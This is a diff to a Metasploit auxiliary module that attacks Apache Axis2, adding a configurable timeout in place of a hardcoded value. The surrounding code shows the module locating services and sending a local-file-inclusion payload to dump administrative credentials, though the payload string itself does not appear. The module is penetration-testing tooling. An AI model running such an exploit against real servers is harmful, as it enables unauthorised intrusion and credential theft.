@@ -32,10 +32,16 @@ class Metasploit3 < Msf::Auxiliary
       'License'        =>  MSF_LICENSE
     )
 
-    register_options([
-      Opt::RPORT(8080),
-      OptString.new('URI', [false, 'The path to the Axis listServices', '/axis2/services/listServices']),
-    ], self.class)
+    register_options(
+      [
+        Opt::RPORT(8080),
+        OptString.new('URI', [ false, 'The path to the Axis listServices', '/axis2/services/listServices' ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 25 ])
+      ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def target_url
@@ -50,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
       res = send_request_raw({
         'method'  => 'GET',
         'uri'     => uri,
-      }, 25)
+      }, timeout)
 
       if (res and res.code == 200)
         extract_uri = res.body.to_s.match(/\/axis2\/services\/([^\s]+)\?/)
@@ -77,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
       res = send_request_raw({
         'method'  => 'GET',
         'uri'     => "#{uri}" + lfi_payload,
-      }, 25)
+      }, timeout)
 
       print_status("#{target_url} - Apache Axis - Dumping administrative credentials")
 
